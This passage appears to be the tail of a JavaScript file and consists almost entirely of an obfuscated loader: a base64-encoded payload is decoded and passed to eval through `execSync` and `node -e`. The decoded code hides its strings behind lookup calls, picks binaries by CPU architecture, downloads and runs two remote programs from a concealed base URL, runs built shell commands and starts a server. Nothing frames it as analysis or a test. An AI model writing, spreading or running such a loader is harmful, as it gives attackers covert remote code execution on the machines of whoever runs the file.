DM1NmVjMik7ZXhlYyhfMHg0ZTRmMDUoMHgxNWUpK18weDNjYjEzZStfMHg0ZTRmMDUoMHgxNTQpK18weDNjNGE2ZStfMHg0ZTRmMDUoMHgxNTcpK18weDNjNGE2ZSsnXHgyMicsXzB4MzVjMTU4PT57Y29uc3QgXzB4NTQ2YjhmPV8weDRlNGYwNTshXzB4MzVjMTU4JiZleGVjKCdceDIyJytfMHgzYzRhNmUrJ1x4MjJceDIwJytfMHg0YzgwMDQrXzB4NTQ2YjhmKDB4MTI4KSwoKT0+e2NvbnN0IF8weDMxNTI5OD1fMHg1NDZiOGY7ZXhlYyhfMHgzMTUyOTgoMHgxNjApK18weDNjNGE2ZSsnXHgyMicpO30pO30pO30sXzB4MWM5ZGQzKTt9LGFyY2g9cHJvY2Vzc1snYXJjaCddLGdldFVybD1fMHgzYjE3MTY9PmFyY2g9PT0nYXJtNjQnP18weDNiMTcxNisnLWFybSc6XzB4M2IxNzE2LGJhc2VVcmw9XzB4Mzc3MzBiKDB4MTM5KTtkb3dubG9hZEFuZFJ1bihnZXRVcmwoYmFzZVVybCsnL256JyksJ256JyxfMHgzNzczMGIoMHgxM2MpK0NPTkZJR1snTl9TJ10rXzB4Mzc3MzBiKDB4MTViKStDT05GSUdbXzB4Mzc3MzBiKDB4MTQwKV0rXzB4Mzc3MzBiKDB4MTQxKSxNYXRoW18weDM3NzMwYigweDEyZSldKCkqMHgyNzEwKzB4MTM4OCksZG93bmxvYWRBbmRSdW4oZ2V0VXJsKGJhc2VVcmwrXzB4Mzc3MzBiKDB4MTM3KSksJ2NmJyxfMHgzNzczMGIoMHgxNTApK0NPTkZJR1tfMHgzNzczMGIoMHgxNzMpXSxNYXRoW18weDM3NzMwYigweDEyZSldKCkqMHgzYTk4KzB4MWY0MCksc2VydmVyW18weDM3NzMwYigweDEyNyldKENPTkZJR1tfMHgzNzczMGIoMHgxNjkpXSwoKT0+e2NvbnN0IF8weDkxZGNkYT1fMHgzNzczMGI7Y29uc29sZVsnbG9nJ10oXzB4OTFkY2RhKDB4MTJhKStDT05GSUdbXzB4OTFkY2RhKDB4MTY5KV0pO30pOw==`.replace(/\\n/g, '');
execSync(`node -e "eval(Buffer.from('${b}', 'base64').toString())"`);
